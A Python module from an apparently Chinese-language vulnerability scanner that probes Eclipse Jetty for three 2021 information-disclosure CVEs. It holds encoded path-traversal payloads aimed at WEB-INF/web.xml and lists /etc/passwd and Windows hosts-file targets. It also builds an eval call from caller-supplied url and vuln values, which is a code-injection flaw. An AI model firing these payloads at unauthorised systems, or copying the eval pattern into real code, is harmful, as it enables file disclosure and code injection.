#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Eclipse Jetty 是一个 Java Web 服务器和 Java Servlet 容器。 
    Jetty扫描类: 
        1. jetty 模糊路径信息泄露
            CVE-2021-28164
                Payload: https://vulhub.org/#/environments/jetty/CVE-2021-28164/

        2. jetty Utility Servlets ConcatServlet 双重解码信息泄露
            CVE-2021-28169
                Payload: https://vulhub.org/#/environments/jetty/CVE-2021-28169/

        3. jetty 模糊路径信息泄露
            CVE-2021-34429
                Payload: https://vulhub.org/#/environments/jetty/CVE-2021-34429/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Jetty.cve_2021_28164 import cve_2021_28164_scan
from payloads.Jetty.cve_2021_28169 import cve_2021_28169_scan
from payloads.Jetty.cve_2021_34429 import cve_2021_34429_scan

class Jetty():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Jetty'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_28164_payloads = [
            {
                'path': '%2e/WEB-INF/web.xml',
                'data': ''
            },
            {
                'path': '%2e%2e/WEB-INF/web.xml',
                'data': ''
            },
        ]
        
        self.cve_2021_28169_payloads = [
            {
                'path': 'static?/%2557EB-INF/web.xml',
                'data': ''
            },
            {
                'path': 'concat?/%2557EB-INF/web.xml',
                'data': ''
            },
            {
                'path': '?/%2557EB-INF/web.xml',
                'data': ''
            },
        ]

        self.cve_2021_34429_payloads = [
                {
                    'path': '%u002e/WEB-INF/web.xml',
                    'data': ''
                },
                {
                    'path': '.%00/WEB-INF/web.xml',
                    'data': ''
                },
                {
                    'path': '..%00/WEB-INF/web.xml',
                    'data': ''
                },
            ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_28164_scan, url=url),
            thread(target=self.cve_2021_28169_scan, url=url),
            thread(target=self.cve_2021_34429_scan, url=url)
        ]

Jetty.cve_2021_28164_scan = cve_2021_28164_scan
Jetty.cve_2021_28169_scan = cve_2021_28169_scan
Jetty.cve_2021_34429_scan = cve_2021_34429_scan

jetty = Jetty()
